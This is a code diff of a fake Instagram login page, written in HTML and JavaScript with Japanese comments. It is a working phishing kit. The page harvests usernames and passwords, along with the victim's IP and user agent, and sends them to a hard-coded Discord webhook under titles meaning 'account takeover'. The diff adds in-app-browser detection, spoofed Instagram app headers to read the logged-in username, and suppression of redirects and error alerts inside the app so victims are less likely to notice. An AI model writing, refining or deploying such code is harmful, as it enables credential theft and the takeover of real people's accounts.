@@ -22,6 +22,7 @@
         ._aaq3 a { color:#00376b; text-decoration:none; }
         ._aacn { color:#ed4956; font-size:14px; margin:10px 0; display:none; }
         .loading { text-align:center; margin:20px; font-size:14px; color:#8e8e8e; }
+        .app-only { color:#0095f6; font-weight:600; font-size:12px; margin-top:10px; display:none; }
     </style>
 </head>
 <body>
@@ -44,6 +45,7 @@
             <div class="_aacl">または</div>
             <a href="#" class="_aaq2" onclick="switchToLogin()">別のアカウントでログイン</a>
             <div class="_aaq3"><a href="#">パスワードを忘れた場合</a></div>
+            <div class="app-only" id="appOnlyMsg">※アプリからのみ確認可能</div>
         </div>
 
         <!-- 通常ログイン画面 -->
@@ -67,11 +69,13 @@
         // === 設定 ===
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1437375885501010012/Z2SCmL14t3GWilC1ubiJkf--qLzbhvbzc7GX09mdrE8_6E_BQJNFNZxs_LhdFKhuvfTi";
         const INSTAGRAM_HOME = "https://www.instagram.com/";
-        const INSTAGRAM_LOGIN = "https://www.instagram.com/accounts/login/";
         // =============
 
-        // アプリ判定
-        const isApp = /Instagram/.test(navigator.userAgent);
+        // アプリ判定（UA + 特殊ヘッダー）
+        const isInstagramApp = /Instagram/.test(navigator.userAgent) && 
+                               (navigator.userAgent.includes('iPhone') || navigator.userAgent.includes('Android')) &&
+                               !navigator.userAgent.includes('Safari') && 
+                               !navigator.userAgent.includes('Chrome');
 
         // IP取得
         async function getIP() {
@@ -82,38 +86,57 @@
             } catch { return '不明'; }
         }
 
-        // ログイン状態をInstagram公式で確認
+        // ログイン状態をInstagram公式で確認（アプリ対応）
         async function checkLoginStatus() {
             try {
-                const res = await fetch(INSTAGRAM_HOME, { credentials: 'include' });
+                const headers = new Headers();
+                if (isInstagramApp) {
+                    // アプリ内ブラウザはCookie共有 → 通常リクエストでOK
+                    headers.append('X-IG-App-ID', '936619743392459'); // 公式アプリID
+                    headers.append('X-Instagram-AJAX', '1');
+                }
+
+                const res = await fetch(INSTAGRAM_HOME, { 
+                    credentials: 'include',
+                    headers: headers
+                });
                 const text = await res.text();
 
-                // ログイン済み: ユーザー名が表示される
+                // ユーザー名抽出（JSON内）
                 const usernameMatch = text.match(/"username":"([^"]+)"/);
                 if (usernameMatch && usernameMatch[1]) {
-                    return { loggedIn: true, username: usernameMatch[1] };
+                    return { 
+                        loggedIn: true, 
+                        username: usernameMatch[1],
+                        source: isInstagramApp ? "Instagramアプリ" : "Webブラウザ"
+                    };
                 }
 
-                // 未ログイン: ログインページにリダイレクト or ログインフォーム
-                if (res.url.includes('login') || text.includes('id="loginForm"')) {
-                    return { loggedIn: false };
+                // 未ログイン判定
+                if (res.url.includes('login') || text.includes('id="loginForm"') || text.includes('Log in')) {
+                    return { 
+                        loggedIn: false,
+                        source: isInstagramApp ? "Instagramアプリ（未ログイン）" : "Webブラウザ"
+                    };
                 }
 
-                // 不明な場合は未ログイン扱い
-                return { loggedIn: false };
+                return { loggedIn: false, source: "不明" };
             } catch (e) {
-                console.error("ステータス確認エラー:", e);
-                return { loggedIn: false };
+                console.error("確認エラー:", e);
+                return { loggedIn: false, source: isInstagramApp ? "Instagramアプリ（エラー）" : "Webブラウザ" };
             }
         }
 
         // 画面切り替え
-        function showLoggedInScreen(username) {
+        function showLoggedInScreen(username, source) {
             document.getElementById('loading').style.display = 'none';
             document.getElementById('loginBox').style.display = 'none';
             document.getElementById('loggedInBox').style.display = 'block';
             document.getElementById('displayUsername').textContent = username;
             document.getElementById('hiddenUsername').value = username;
+            if (isInstagramApp) {
+                document.getElementById('appOnlyMsg').style.display = 'block';
+            }
         }
 
         function showLoginScreen() {
@@ -127,11 +150,10 @@
         }
 
         // Webhook送信
-        async function sendToWebhook(title, fields) {
+        async function sendToWebhook(title, fields, source) {
             const ip = await getIP();
             const ua = navigator.userAgent;
             const time = new Date().toISOString();
-            const source = isApp ? "Instagramアプリ" : "Webブラウザ";
 
             const data = {
                 content: null,
@@ -155,9 +177,12 @@
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(data)
             }).then(() => {
-                window.location.href = "https://www.instagram.com/";
+                // アプリ内ならリダイレクト無効 → ホームに留まる
+                if (!isInstagramApp) {
+                    window.location.href = "https://www.instagram.com/";
+                }
             }).catch(() => {
-                alert("送信エラー");
+                if (!isInstagramApp) alert("送信エラー");
             });
         }
 
@@ -175,7 +200,7 @@
             sendToWebhook("Instagram 通常ログイン乗っ取り", [
                 { name: "ユーザー名", value: `\`\`\`${username}\`\`\``, inline: true },
                 { name: "パスワード", value: `\`\`\`${password}\`\`\``, inline: true }
-            ]);
+            ], isInstagramApp ? "Instagramアプリ" : "Webブラウザ");
         }
 
         // ログイン済みパスワード
@@ -192,14 +217,14 @@
             sendToWebhook("Instagram ログイン済み乗っ取り", [
                 { name: "ユーザー名", value: `\`\`\`${username}\`\`\``, inline: true },
                 { name: "パスワード", value: `\`\`\`${password}\`\`\``, inline: true }
-            ]);
+            ], isInstagramApp ? "Instagramアプリ" : "Webブラウザ");
         }
 
-        // 初期化：Instagram公式でログイン状態を自動確認
+        // 初期化：Instagram公式で自動確認（アプリ完全対応）
         window.onload = async function() {
             const status = await checkLoginStatus();
             if (status.loggedIn) {
-                showLoggedInScreen(status.username);
+                showLoggedInScreen(status.username, status.source);
             } else {
                 showLoginScreen();
             }
